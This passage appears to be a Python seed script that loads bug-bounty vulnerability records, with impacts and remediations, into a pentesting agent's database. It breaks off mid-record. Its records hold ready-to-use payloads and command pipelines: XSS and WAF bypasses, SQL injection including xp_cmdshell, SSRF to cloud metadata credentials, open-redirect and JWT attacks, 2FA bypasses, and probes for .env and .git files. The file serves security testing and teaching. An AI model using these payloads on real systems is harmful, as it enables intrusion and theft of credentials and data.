"""
Seed VulnerabilityLearning records from KingOfBugBountyTips and AllAboutBugBounty.
Run inside backend container: python3 scripts/seed_bugrepo_learnings.py
"""
from __future__ import annotations
import sys
from datetime import datetime

sys.path.insert(0, "/app")

from app.db.session import SessionLocal
from app.models.models import VulnerabilityLearning

OWNER_ID = 1  # admin user

LEARNINGS = [
    # ─────────────────────────────────────────────────────────────────────
    # RECONNAISSANCE / SUBDOMAIN ENUMERATION (P01, P02, P03, P04)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "Subdomain Enumeration - Full Arsenal (KingOfBugBounty)",
        "vulnerability_type": "Asset Discovery",
        "source_kind": "bug_bounty_repository",
        "source_urls": ["https://github.com/KingOfBugbounty/KingOfBugBountyTips"],
        "summary": "Complete subdomain enumeration methodology using passive and active sources. Combine subfinder, amass, assetfinder, and chaos for maximum coverage, then probe with httpx.",
        "steps_to_reproduce": """
1. Passive enumeration (multiple sources):
   subfinder -d target.com -all -silent | anew subs.txt
   amass enum -passive -d target.com | anew subs.txt
   assetfinder -subs-only target.com | anew subs.txt
   chaos -d target.com -silent | anew subs.txt

2. Certificate transparency:
   curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*.//g' | sort -u | anew subs.txt

3. DNS brute force with mutations:
   dnsx -l subs.txt -silent -a -aaaa -cname | anew resolved.txt
   alterx -l subs.txt | dnsx -silent | anew resolved.txt
   shuffledns -d target.com -w wordlist.txt -r resolvers.txt | anew resolved.txt

4. Probe alive hosts:
   cat resolved.txt | httpx -silent -title -status-code -tech-detect -threads 100 | anew alive.txt

5. Reverse DNS on IP ranges:
   cat alive.txt | dnsx -ptr -silent | anew ptr_records.txt
   hakrevdns -d target_ip_range | anew reverse_dns.txt

Evidence: alive.txt with live subdomains, resolved.txt with DNS records, ptr_records.txt
""",
        "impact": "Unidentified subdomains may host forgotten services, legacy applications, or staging environments with weaker security controls. Shadow IT exposure can lead to data breaches.",
        "remediation": "Maintain an asset inventory. Use a CMDB or EASM tool to continuously monitor for new subdomains. Decommission unused services and ensure all subdomains are covered by security scanning.",
        "learned_mission": "During reconnaissance, enumerate ALL subdomains using passive and active techniques. Never rely on a single source. Use certificate transparency, DNS brute force, permutation, and reverse DNS together.",
        "learned_prompt": "Use subfinder+amass+assetfinder in parallel. Validate with dnsx. Probe with httpx. Mutate with alterx. Check certificate transparency via crt.sh.",
        "affected_phases": ["P01", "P02"],
        "affected_skills": ["asset_discovery", "reconnaissance"],
        "recommended_tools": ["subfinder", "amass", "dnsx", "shuffledns", "assetfinder", "alterx", "httpx", "naabu"],
        "learned_techniques": [
            {"name": "Passive subdomain enumeration", "phase": "P01", "tool": "subfinder"},
            {"name": "Active DNS brute force", "phase": "P01", "tool": "shuffledns"},
            {"name": "Certificate transparency mining", "phase": "P01", "tool": "curl"},
            {"name": "Subdomain permutation", "phase": "P01", "tool": "alterx"},
            {"name": "Alive host probing", "phase": "P02", "tool": "httpx"},
        ],
    },
    {
        "title": "Web Crawling & JS Endpoint Extraction (KingOfBugBounty)",
        "vulnerability_type": "Asset Discovery",
        "source_kind": "bug_bounty_repository",
        "source_urls": ["https://github.com/KingOfBugbounty/KingOfBugBountyTips"],
        "summary": "Deep web crawling combining live crawlers with historical URL sources. Extract JS endpoints and hidden API routes. Katana+gospider+gau+waybackurls gives maximum URL coverage.",
        "steps_to_reproduce": """
1. Live crawl with katana (with JS parsing):
   katana -u https://target.com -d 10 -jc -kf all -aff -silent | anew crawl.txt

2. Historical URLs:
   gau target.com --threads 50 | anew urls.txt
   waybackurls target.com | anew urls.txt
   waymore -i target.com -mode U -oU waymore_urls.txt

3. Gospider with sitemap and robots:
   gospider -s https://target.com -c 20 -d 5 --sitemap --robots --js | anew gospider.txt

4. Extract JS files and mine endpoints:
   cat crawl.txt | grep "\.js$" | httpx -silent -mc 200 | anew js_files.txt
   cat js_files.txt | xargs -I@ curl -s @ | grep -oE "[\"'][/][a-zA-Z0-9_/-]*(api|admin|config|settings|internal)[a-zA-Z0-9_/-]*[\"']" | tr -d "\"'" | sort -u | anew hidden_routes.txt

5. DOM XSS detection in JS:
   cat js_files.txt | xargs -I@ bash -c 'curl -s @ | grep -E "(document.(location|URL|cookie)|innerHTML|outerHTML|eval\(|\.write\()" && echo "--- @ ---"'

6. Merge and deduplicate:
   cat crawl.txt urls.txt waymore_urls.txt | uro | sort -u | anew all_urls.txt

Evidence: all_urls.txt, hidden_routes.txt, js_files.txt
""",
        "impact": "Undiscovered endpoints and JS-exposed API routes often lack authentication or expose sensitive data. Historical URLs may contain removed but still accessible functionality.",
        "remediation": "Remove sensitive endpoints from JS bundles. Implement proper access controls on all discovered routes. Audit historical URLs to ensure deprecated endpoints are fully decommissioned.",
        "learned_mission": "Crawl all live targets with katana and gospider. Mine historical URLs from Wayback and GAU. Parse all JS files for hidden API routes. Use uro to deduplicate before scanning.",
        "learned_prompt": "Run katana with -jc -kf all for JS parsing. Combine with waybackurls and gau. Extract and analyze all JS files for endpoints and secrets.",
        "affected_phases": ["P03", "P04"],
        "affected_skills": ["asset_discovery", "reconnaissance"],
        "recommended_tools": ["katana", "hakrawler", "gau", "waybackurls", "gospider"],
        "learned_techniques": [
            {"name": "JS-aware crawling", "phase": "P03", "tool": "katana"},
            {"name": "Historical URL mining", "phase": "P03", "tool": "gau"},
            {"name": "JS endpoint extraction", "phase": "P03", "tool": "katana"},
            {"name": "Sitemap and robots.txt parsing", "phase": "P03", "tool": "gospider"},
        ],
    },
    {
        "title": "Parameter Discovery - Hidden Parameters (KingOfBugBounty)",
        "vulnerability_type": "Asset Discovery",
        "source_kind": "bug_bounty_repository",
        "source_urls": ["https://github.com/KingOfBugbounty/KingOfBugBountyTips"],
        "summary": "Discover hidden GET/POST parameters using arjun, x8, ffuf, and parameter mining from JS files and wayback data.",
        "steps_to_reproduce": """
1. Arjun parameter discovery:
   arjun -i urls.txt -oT arjun_params.txt --stable

2. Mine parameters from JS files:
   cat js.txt | xargs -I@ curl -s @ | grep -oE "[?&][a-zA-Z0-9_]+=" | cut -d'=' -f1 | tr -d '?&' | sort -u | anew js_params.txt

3. Mine from wayback:
   echo target.com | waybackurls | grep "=" | uro | unfurl keys | sort -u | anew wayback_params.txt

4. ffuf parameter bruteforce:
   ffuf -u "https://target.com/page?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200,302,400 -ac -c -t 100

5. HTTP Parameter Pollution:
   cat urls.txt | qsreplace 'param=value1&param=value2' | httpx -silent -mc 200

6. ParamSpider:
   paramspider -d target.com --exclude woff,css,js,png,svg,jpg -o params.txt

Evidence: arjun_params.txt, js_params.txt, wayback_params.txt, params.txt
""",
        "impact": "Hidden parameters may control application logic, bypass access controls, or introduce injection points not visible in normal application flow.",
        "remediation": "Audit all accepted parameters server-side. Remove debug/internal parameters from production. Validate and whitelist all accepted input parameters.",
        "learned_mission": "Discover all hidden parameters from JS files, Wayback, and active fuzzing before exploitation. Combine arjun, ffuf, and paramspider for full coverage.",
        "learned_prompt": "Use arjun for active discovery. Mine JS and wayback for parameters. Fuzz with ffuf using burp-parameter-names wordlist.",
        "affected_phases": ["P04"],
        "affected_skills": ["asset_discovery", "delivery_mapping"],
        "recommended_tools": ["arjun", "paramspider", "ffuf-params", "wfuzz"],
        "learned_techniques": [
            {"name": "Active parameter discovery", "phase": "P04", "tool": "arjun"},
            {"name": "JS parameter mining", "phase": "P04", "tool": "katana"},
            {"name": "Wayback parameter extraction", "phase": "P04", "tool": "waybackurls"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # XSS (P12, P16)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "Cross-Site Scripting (XSS) - Full Exploitation Guide (AllAboutBugBounty)",
        "vulnerability_type": "XSS",
        "source_kind": "bug_bounty_repository",
        "source_urls": ["https://github.com/daffainfo/AllAboutBugBounty"],
        "summary": "Complete XSS exploitation covering reflected, stored, DOM-based, file upload, and WAF bypass techniques. Includes payloads for Cloudflare, Imperva, ModSecurity, and AWS WAF.",
        "steps_to_reproduce": """
Types: Reflected XSS (from server response), Stored XSS (persisted), DOM-based XSS (in JS).

BASIC PAYLOADS:
  <script>alert(1)</script>
  <svg/onload=alert(1)>
  <img src=x onerror=alert(1)>

ESCAPE FROM HTML ATTRIBUTE VALUE:
  "><script>alert(1)</script>
  '><script>alert(1)</script>

ESCAPE FROM HTML COMMENTS:
  --><script>alert(1)</script>

ESCAPE FROM INSIDE TAG:
  </tag><script>alert(1)</script>

ATTRIBUTE EVENT INJECTION:
  " onmouseover=alert(1)
  " autofocus onfocus=alert(1)

INSIDE SCRIPT BLOCK (string context):
  '-alert(1)-'
  \'alert(1)//
  ${alert(1)}  (backtick strings)

JAVASCRIPT FILE UPLOAD XSS:
  "><svg onload=alert(1)>.jpeg
  exiftool -Artist='"><script>alert(1)</script>' file.jpeg
  SVG: <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>

WAF BYPASS - CLOUDFLARE:
  <svg%0Aonauxclick=0;[1].some(confirm)//
  <svg/onload={alert`1`}>
  Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();

WAF BYPASS - IMPERVA:
  <x/onclick=globalThis&lsqb;'pro'+'mpt']&lt;)>clickme
  <svg onload\r\n=$.globalEval("al"+"ert()");>

WAF BYPASS - MODSECURITY:
  <a href="jav%0Dascript&colon;alert(1)">

AUTOMATED DETECTION (KingOfBugBounty):
  cat urls.txt | gf xss | uro | qsreplace '"><svg onload=confirm(1)>' | dalfox pipe --silence --skip-bav
  echo target.com | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
  cat urls.txt | kxss 2>/dev/null | grep -v "Not Reflected" | anew reflected_params.txt

DOM XSS detection:
  cat js.txt | xargs -I@ bash -c 'curl -s @ | grep -E "(document.(location|URL|cookie|domain|referrer)|innerHTML|outerHTML|eval\(|\.write\()"'

Evidence: alert box triggered, cookie theft, session hijacking proof
""",
        "impact": "XSS allows session hijacking, credential theft, defacement, malware distribution, and CSRF bypasses. Stored XSS affects all users visiting the page.",
        "remediation": "Implement Content Security Policy (CSP). Encode all output (HTML, JS, URL, CSS context-aware). Use HTTPOnly and Secure flags on cookies. Validate input server-side.",
        "learned_mission": "Test all reflected parameters for XSS. Use dalfox and airixss for automation. Test file upload XSS via filename and metadata. Check JS files for DOM sinks.",
        "learned_prompt": "Use gf xss pattern to filter candidates. Run dalfox for automated detection. Test WAF bypass payloads. Check DOM sinks in JS for DOM XSS.",
        "affected_phases": ["P12", "P16"],
        "affected_skills": ["risk_assessment", "exploitation_validation"],
        "recommended_tools": ["dalfox", "nuclei", "wapiti", "nikto"],
        "learned_techniques": [
            {"name": "Reflected XSS", "phase": "P12", "tool": "dalfox"},
            {"name": "Stored XSS", "phase": "P12", "tool": "dalfox"},
            {"name": "DOM XSS", "phase": "P12", "tool": "katana"},
            {"name": "WAF bypass XSS", "phase": "P12", "tool": "dalfox"},
            {"name": "File upload XSS", "phase": "P12", "tool": "nuclei"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # SQL INJECTION (P12)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "SQL Injection - Complete Exploitation Techniques (AllAboutBugBounty + KingOfBugBounty)",
        "vulnerability_type": "SQL Injection",
        "source_kind": "bug_bounty_repository",
        "source_urls": ["https://github.com/daffainfo/AllAboutBugBounty", "https://github.com/KingOfBugbounty/KingOfBugBountyTips"],
        "summary": "SQL injection covering error-based, UNION-based, boolean blind, time-based blind, and out-of-band techniques for MySQL, PostgreSQL, and MSSQL.",
        "steps_to_reproduce": """
DETECTION - add single quote to parameters:
  http://target.com/page?id=5'

UNION-BASED (MySQL):
  Find column count: id=-1 ORDER BY 1,2,3 (until error)
  Find injectable: id=-1 UNION SELECT 1,2,3
  Extract data: id=-1 UNION SELECT 1,version(),database()
  Tables: UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()
  Columns: UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'
  Data: UNION SELECT 1,concat(username,':',password),3 FROM users

UNION-BASED (PostgreSQL):
  id=-1 UNION SELECT NULL,NULL,version()
  id=-1 UNION SELECT 1,datname,NULL FROM pg_database

ERROR-BASED (MSSQL):
  id=-1 OR 1 IN (SELECT TOP 1 CAST(user_name() AS varchar(4096)))--
  id=-1 OR db_name(0)=0--

TIME-BASED BLIND:
  MySQL: 1' AND SLEEP(5)-- -
  PostgreSQL: 1' AND pg_sleep(5)-- -
  MSSQL: 1'; WAITFOR DELAY '0:0:5'--

BOOLEAN-BASED:
  1' AND '1'='1 (true - normal response)
  1' AND '1'='2 (false - different response)

MSSQL SHELL (requires sa):
  EXEC master..xp_cmdshell 'whoami'
  EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_shell',1; RECONFIGURE;

AUTOMATED SCANNING (KingOfBugBounty):
  cat urls.txt | gf sqli | uro | anew sqli.txt
  sqlmap -m sqli.txt --batch --random-agent --level 2 --risk 2
  cat urls.txt | gf sqli | qsreplace "'" | httpx -silent -ms "error|sql|syntax|mysql|postgresql"
  cat sqli.txt | xargs -I@ ghauri -u @ --batch --level 3

NoSQL Injection:
  cat urls.txt | qsreplace '{"$gt":""}' | httpx -silent -mc 200
  username[$ne]=toto&password[$ne]=wrong
  password[$regex]=.{1} (enumerate length)

Evidence: DB version, table names, extracted credentials, or time delay confirmation
""",
        "impact": "SQLi allows complete database read/write, authentication bypass, data exfiltration, and in some cases RCE via database shell commands.",
        "remediation": "Use parameterized queries / prepared statements. Apply principle of least privilege to DB users. Disable xp_cmdshell. Use WAF and input validation.",
        "learned_mission": "Test all parameters with gf sqli pattern. Run sqlmap with --batch for automation. Test NoSQL injection on MongoDB endpoints. Look for error messages revealing DB type.",
        "learned_prompt": "Filter URLs with gf sqli. Run sqlmap with --level 2 --risk 2. Test error-based with single quote. Use ghauri as alternative. Test NoSQL operators for MongoDB.",
        "affected_phases": ["P12"],
        "affected_skills": ["risk_assessment", "exploitation_validation"],
        "recommended_tools": ["sqlmap", "wapiti", "nikto", "nuclei"],
        "learned_techniques": [
            {"name": "Error-based SQLi", "phase": "P12", "tool": "sqlmap"},
            {"name": "UNION-based SQLi", "phase": "P12", "tool": "sqlmap"},
            {"name": "Blind time-based SQLi", "phase": "P12", "tool": "sqlmap"},
            {"name": "NoSQL injection", "phase": "P12", "tool": "nuclei"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # SSRF (P13)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "Server-Side Request Forgery (SSRF) - Full Exploitation (AllAboutBugBounty + KingOfBugBounty)",
        "vulnerability_type": "SSRF",
        "source_kind": "bug_bounty_repository",
        "source_urls": ["https://github.com/daffainfo/AllAboutBugBounty", "https://github.com/KingOfBugbounty/KingOfBugBountyTips"],
        "summary": "SSRF exploitation covering IP obfuscation, scheme abuse, cloud metadata access, DNS rebinding, and parameter identification. Includes full automated pipelines.",
        "steps_to_reproduce": """
TARGET PARAMETERS (look for):
  url=, uri=, path=, src=, dest=, redirect=, redir=, return=, next=, target=, out=, view=, page=, show=, fetch=, load=

IP OBFUSCATION (bypass filters):
  127.0.0.1 → 0x7f000001 (hex) → 2130706433 (decimal/dword) → 0177.0.0.1 (octal)
  IPv6: http://[::1]/ or http://[::ffff:127.0.0.1]/
  DNS: localtest.me → resolves to 127.0.0.1
  Redirects: http://evil.com/ssrf → 302 → http://127.0.0.1/

SCHEME ABUSE:
  file:///etc/passwd
  dict://127.0.0.1:6379/info  (Redis)
  gopher://127.0.0.1:25/      (SMTP)
  ftp://127.0.0.1:21/
  ldap://127.0.0.1/
  sftp://127.0.0.1/

AWS CLOUD METADATA:
  http://169.254.169.254/latest/meta-data/
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
  http://169.254.169.254/latest/user-data

GCP METADATA:
  http://metadata.google.internal/computeMetadata/v1/
  http://169.254.169.254/computeMetadata/v1/

AZURE METADATA:
  http://169.254.169.254/metadata/instance?api-version=2021-02-01

DNS REBINDING:
  http://7f000001.burpcollaborator.net

AUTOMATED DETECTION (KingOfBugBounty):
  cat urls.txt | gf ssrf | qsreplace "https://YOURBURP.oastify.com" | httpx -silent
  cat params.txt | grep -iE "(url|uri|path|src|dest|redirect|return|next|target|fetch|load)" | qsreplace "http://YOURSERVER" | httpx -silent
  cat urls.txt | qsreplace "http://169.254.169.254/latest/meta-data/" | httpx -silent -match-string "ami-id"

OUT-OF-BAND DETECTION:
  Use interactsh-client to detect blind SSRF:
  interactsh-client &
  cat urls.txt | gf ssrf | qsreplace "http://INTERACTSH_URL" | httpx -silent

Evidence: Response from internal service, cloud metadata credentials, DNS ping to collaborator
""",
        "impact": "SSRF can lead to internal network scanning, cloud credential theft (AWS IMDSv1), RCE via exposed internal services (Redis, Elasticsearch), and data exfiltration.",
        "remediation": "Validate and whitelist URLs server-side. Block access to 169.254.0.0/16 and 10.0.0.0/8. Use IMDSv2 on AWS. Disable unused URL scheme handlers.",
        "learned_mission": "Test all URL parameters for SSRF. Use interactsh for blind detection. Specifically test for AWS/GCP/Azure metadata endpoints. Try all IP obfuscation techniques.",
        "learned_prompt": "Use gf ssrf to filter candidates. Use interactsh-client for OOB detection. Test cloud metadata URLs. Try scheme abuse (file://, dict://, gopher://).",
        "affected_phases": ["P13"],
        "affected_skills": ["risk_assessment", "threat_intel"],
        "recommended_tools": ["nuclei", "interactsh-client", "httpx"],
        "learned_techniques": [
            {"name": "Basic SSRF", "phase": "P13", "tool": "nuclei"},
            {"name": "Blind SSRF with OOB", "phase": "P13", "tool": "interactsh-client"},
            {"name": "Cloud metadata SSRF", "phase": "P13", "tool": "nuclei"},
            {"name": "SSRF via scheme abuse", "phase": "P13", "tool": "nuclei"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # OPEN REDIRECT (P13)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "Open Redirect - Bypass Techniques (AllAboutBugBounty)",
        "vulnerability_type": "Open Redirect",
        "source_kind": "bug_bounty_repository",
        "source_urls": ["https://github.com/daffainfo/AllAboutBugBounty"],
        "summary": "Open redirect exploitation and bypass techniques. Common in login/logout pages. Used to chain with OAuth token theft and phishing.",
        "steps_to_reproduce": """
WHERE TO FIND: login, logout, register pages and JS source code.

BASIC:
  /?redir=https://evil.com
  /?url=https://evil.com

BYPASS WHITELISTED DOMAIN:
  /?redir=https://target.com.evil.com
  /?redir=https://evil.com?target.com
  /?redir=https://evil.com/target.com

@ TRICK (browser redirects after @):
  /?redir=https://target.com@evil.com
  /?redir=https://target.com%40evil.com

SPECIAL CHARACTERS:
  /?redir=//evil.com
  /?redir=/\evil.com
  /?redir=///evil.com
  /?redir=////evil.com
  /?redir=https:evil.com
  /?redir=https:/evil.com

ENCODED:
  /?redir=%2F%2Fevil.com
  /?redir=%5C%5Cevil.com
  /?redir=%00https://evil.com (null byte)
  /?redir=%0dhttps://evil.com (CR)

UNICODE/HOMOGRAPH:
  /?redir=https://evil。com (Unicode fullstop U+3002)
  /?redir=https://xn--evil-ira.com

PATH MANIPULATION:
  /?redir=/../../evil.com
  /redirect/../evil.com

PARAMETER POLLUTION:
  /?redir=target.com&redir=evil.com

Evidence: Browser redirects to attacker-controlled domain
""",
        "impact": "Open redirects enable phishing attacks, OAuth token theft, and SSRF chaining. Can bypass referrer-based CSRF protection.",
        "remediation": "Use allowlists for redirect destinations. Avoid user-controllable redirect parameters. If needed, validate the full URL including scheme, host, and path.",
        "learned_mission": "Test login/logout/register pages for open redirect parameters. Try all bypass techniques. Chain with OAuth flow for token theft.",
        "learned_prompt": "Look for redirect/return/next/url parameters on auth pages. Test // and @ tricks first. Try encoded variants for filter bypass.",
        "affected_phases": ["P13"],
        "affected_skills": ["risk_assessment", "adversarial_hypothesis"],
        "recommended_tools": ["nuclei", "httpx"],
        "learned_techniques": [
            {"name": "Basic open redirect", "phase": "P13", "tool": "nuclei"},
            {"name": "Open redirect bypass with @", "phase": "P13", "tool": "httpx"},
            {"name": "Open redirect with encoding", "phase": "P13", "tool": "httpx"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # IDOR (P19)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "Insecure Direct Object Reference (IDOR) - Exploitation Methods (AllAboutBugBounty)",
        "vulnerability_type": "IDOR",
        "source_kind": "bug_bounty_repository",
        "source_urls": ["https://github.com/daffainfo/AllAboutBugBounty"],
        "summary": "IDOR testing methodology covering parameter injection, encoding attacks, HTTP method changes, and access control flaws in APIs.",
        "steps_to_reproduce": """
WHERE: APIs using user_id, id, account_id, uid parameters.

TECHNIQUES:
1. Parameter injection - add ?user_id=VICTIM_ID to requests
2. HTTP Parameter Pollution - submit id=mine&id=victim
3. Format manipulation - append .json extension
4. Older API versions - try /api/v1/ instead of /api/v3/
5. Array wrapping - {"id": [1,2,3]} or {"id": {"$gt": 0}}
6. Base64/MD5 decode - decode ID and modify
7. GraphQL - test object access in GraphQL queries
8. Case manipulation - /ADMIN/ vs /admin/
9. UUID to integer swap - replace UUID with sequential integer
10. HTTP method change - POST instead of GET
11. Path traversal - /../other_user/data
12. Content-Type switch - application/json vs application/x-www-form-urlencoded
13. Wildcard - replace id with *, %, _, .

AUTOMATED:
  cat urls.txt | grep -oE "(id|user_id|account_id|uid)=[0-9]+" | sed 's/=[0-9]*/=FUZZ/' | sort -u | anew bola_candidates.txt

CHAINING:
  IDOR + CSRF = account takeover without user interaction
  IDOR on password change endpoint + victim's user_id = full account takeover

Evidence: Response contains another user's data, or action performed on victim account
""",
        "impact": "IDOR leads to unauthorized data access, account takeover, privilege escalation, and mass data exfiltration.",
        "remediation": "Implement server-side authorization checks for every object access. Use indirect references (random UUIDs). Log and alert on access pattern anomalies.",
        "learned_mission": "Test all API endpoints with modified user IDs. Try numeric, UUID, and encoded formats. Change HTTP methods. Test array and object wrapping of IDs.",
        "learned_prompt": "Find all ID parameters in API calls. Replace with another user's ID. Try all encoding and format variants. Check GraphQL for object access.",
        "affected_phases": ["P19"],
        "affected_skills": ["risk_assessment", "exploitation_validation"],
        "recommended_tools": ["nuclei", "katana", "arjun", "curl-headers"],
        "learned_techniques": [
            {"name": "Direct IDOR", "phase": "P19", "tool": "nuclei"},
            {"name": "IDOR via HTTP method change", "phase": "P19", "tool": "httpx"},
            {"name": "IDOR via encoding", "phase": "P19", "tool": "httpx"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # AUTHENTICATION (P14)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "Authentication Bypass - JWT Vulnerabilities (AllAboutBugBounty)",
        "vulnerability_type": "Authentication Bypass",
        "source_kind": "bug_bounty_repository",
        "source_urls": ["https://github.com/daffainfo/AllAboutBugBounty"],
        "summary": "JWT exploitation including algorithm confusion (RS256→HS256), none algorithm, and weak key brute force.",
        "steps_to_reproduce": """
DETECT JWT: Look for eyJ base64 tokens in headers/cookies/responses.

1. NONE ALGORITHM ATTACK:
   Decode JWT header: {"alg":"RS256","typ":"JWT"}
   Change to: {"alg":"none","typ":"JWT"}
   Remove signature: header.payload. (empty signature)
   Re-encode and submit

2. ALGORITHM CONFUSION (RS256 → HS256):
   Get server's public key from /jwks.json or /.well-known/jwks.json
   Change header alg from RS256 to HS256
   Sign the token using the PUBLIC KEY as HMAC secret
   Server verifies HS256 with public key = accepts attacker token

3. WEAK KEY BRUTE FORCE:
   hashcat -a 0 -m 16500 jwt.txt wordlist.txt
   Tool: jwt-hack (github.com/hahwul/jwt-hack)

4. HEADER CLAIM INJECTION:
   Add "kid" or "jku" parameter pointing to attacker-controlled key
   kid: path traversal → "../../dev/null" (empty key)
   jku: point to attacker's JWKS endpoint

AUTOMATED (KingOfBugBounty):
   cat urls.txt | httpx -silent | katana -d 3 -silent | grep -oE "eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*" | anew jwts.txt
   jwt_tool.py JWT -t https://target.com -rh "Authorization: Bearer JWT" -M at

Evidence: Admin access with modified JWT, or access to other user's data
""",
        "impact": "JWT vulnerabilities lead to authentication bypass, privilege escalation, and account takeover for all users.",
        "remediation": "Pin algorithm server-side. Use asymmetric keys for RS256. Validate all header claims. Use short expiry. Implement key rotation.",
        "learned_mission": "Extract all JWTs from traffic. Test none algorithm and algorithm confusion. Try weak key brute force. Check jwks.json endpoints.",
        "learned_prompt": "Find JWTs in responses. Use jwt_tool to test none algorithm and RS256→HS256 confusion. Check for kid/jku injection points.",
        "affected_phases": ["P14"],
        "affected_skills": ["risk_assessment", "installation_risk"],
        "recommended_tools": ["jwt_tool", "nuclei", "curl-headers"],
        "learned_techniques": [
            {"name": "JWT none algorithm", "phase": "P14", "tool": "jwt_tool"},
            {"name": "JWT algorithm confusion", "phase": "P14", "tool": "jwt_tool"},
            {"name": "JWT weak key bruteforce", "phase": "P14", "tool": "jwt_tool"},
        ],
    },
    {
        "title": "2FA Bypass Techniques (AllAboutBugBounty)",
        "vulnerability_type": "Authentication Bypass",
        "source_kind": "bug_bounty_repository",
        "source_urls": ["https://github.com/daffainfo/AllAboutBugBounty"],
        "summary": "13 techniques for bypassing two-factor authentication including response manipulation, code reuse, brute force, and clickjacking.",
        "steps_to_reproduce": """
1. RESPONSE MANIPULATION:
   Intercept 2FA verification response
   Change {"code": false} → {"code": true}

2. STATUS CODE MANIPULATION:
   Change 404 Not Found → 200 OK in response

3. 2FA CODE IN RESPONSE:
   POST /req-2fa/ with victim email
   Check response for "code" field - may contain OTP

4. BRUTEFORCE (no rate limit):
   Attempt all 6-digit codes 000000-999999
   Test if rate limiting exists after N attempts

5. CODE INTEGRITY BYPASS:
   Use attacker's valid OTP for victim's account
   POST /2fa/ email=victim@example.com&code=ATTACKER_CODE

6. NULL/ZERO BYPASS:
   code=000000
   code=null
   code=

7. CODE REUSE:
   Use same OTP code twice - no single-use enforcement

8. CSRF ON 2FA DISABLE:
   Disable 2FA without auth confirmation via CSRF

9. CLICKJACKING ON DISABLE PAGE:
   iframe the 2FA disable page, trick user into clicking

10. SESSION PERSISTENCE:
    Enable 2FA doesn't expire existing sessions
    Hijacked session remains valid after 2FA enabled

11. PASSWORD CHANGE DISABLES 2FA:
    Change password via CSRF, 2FA gets disabled

12. BACKUP CODE ABUSE:
    Brute force backup codes, test rate limiting

Evidence: Successful login without valid 2FA code, or 2FA disabled without user action
""",
        "impact": "2FA bypass defeats the second authentication factor, enabling account takeover even when password is unknown.",
        "remediation": "Enforce rate limiting on OTP attempts. Make codes single-use. Enforce code integrity per user. Expire sessions on 2FA enrollment. Add CSRF protection to 2FA disable.",
        "learned_mission": "Test 2FA implementation for response manipulation, brute force, and code integrity. Check if 2FA can be disabled via CSRF.",
        "learned_prompt": "Intercept 2FA requests. Test response manipulation. Try null/000000 codes. Check if OTP is returned in response. Test for missing rate limiting.",
        "affected_phases": ["P14"],
        "affected_skills": ["risk_assessment", "installation_risk"],
        "recommended_tools": ["nuclei", "hydra", "curl-headers"],
        "learned_techniques": [
            {"name": "2FA response manipulation", "phase": "P14", "tool": "nuclei"},
            {"name": "2FA brute force", "phase": "P14", "tool": "hydra"},
            {"name": "2FA code reuse", "phase": "P14", "tool": "nuclei"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # CONTENT DISCOVERY (P15)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "Content Discovery & Directory Fuzzing (KingOfBugBounty)",
        "vulnerability_type": "Information Disclosure",
        "source_kind": "bug_bounty_repository",
        "source_urls": ["https://github.com/KingOfBugbounty/KingOfBugBountyTips"],
        "summary": "Complete content discovery methodology using ffuf recursive fuzzing, feroxbuster, backup file discovery, git exposure, and sensitive file detection.",
        "steps_to_reproduce": """
BASIC DIRECTORY FUZZING:
  ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302,403 -ac -c -t 100

RECURSIVE FUZZING:
  ffuf -u https://target.com/FUZZ -w wordlist.txt -recursion -recursion-depth 3 -mc 200,301,302,403 -ac -e .php,.asp,.aspx,.jsp,.bak,.old,.conf,.zip

FEROXBUSTER RECURSIVE:
  feroxbuster -u https://target.com -w wordlist.txt -d 5 -L 4 --auto-tune -C 404,500 --smart
  feroxbuster -u https://target.com -w wordlist.txt --extract-links --collect-words --collect-backups -x php,html,js,json

GIT EXPOSURE:
  cat urls.txt | httpx -silent -path /.git/config -mc 200 -ms "[core]"
  git-dumper http://target.com/.git ./dumped_repo

VERSION CONTROL SYSTEMS:
  /.git/ → git-dumper
  /.svn/entries → svn-extractor
  /.hg/ → hg-dumper
  /.bzr/ → bzr_dumper
  /CVS/Root

SENSITIVE FILES:
  cat urls.txt | httpx -silent -path /.env,/config.php,/wp-config.php.bak,/.htaccess,/server-status
  # Database files:
  cat alive.txt | httpx -silent -path /database.sql,/db.sql,/backup.sql,/dump.sql
  # Backup files:
  cat urls.txt | sed 's/$/.bak/' | httpx -silent -mc 200
  cat urls.txt | sed 's/$/.old/' | httpx -silent -mc 200
  # Config files:
  cat alive.txt | httpx -silent -path /config.json,/config.yaml,/settings.json,/app.config
  # API docs:
  cat urls.txt | httpx -silent -path /swagger.json,/openapi.json,/api-docs,/swagger-ui.html

403 BYPASS TECHNIQUES (AllAboutBugBounty):
  X-Original-URL: /admin
  /%2e/admin (URL encoding)
  /admin/. (trailing dot)
  /admin/./ (dot-slash)
  /admin;/ (semicolon)
  /..;/admin (directory trick)
  /ADMIN (uppercase)

Evidence: Accessible sensitive files, exposed source code, accessible admin panels
""",
        "impact": "Exposed sensitive files (.env, database backups, .git) can contain credentials, source code, and infrastructure details enabling complete system compromise.",
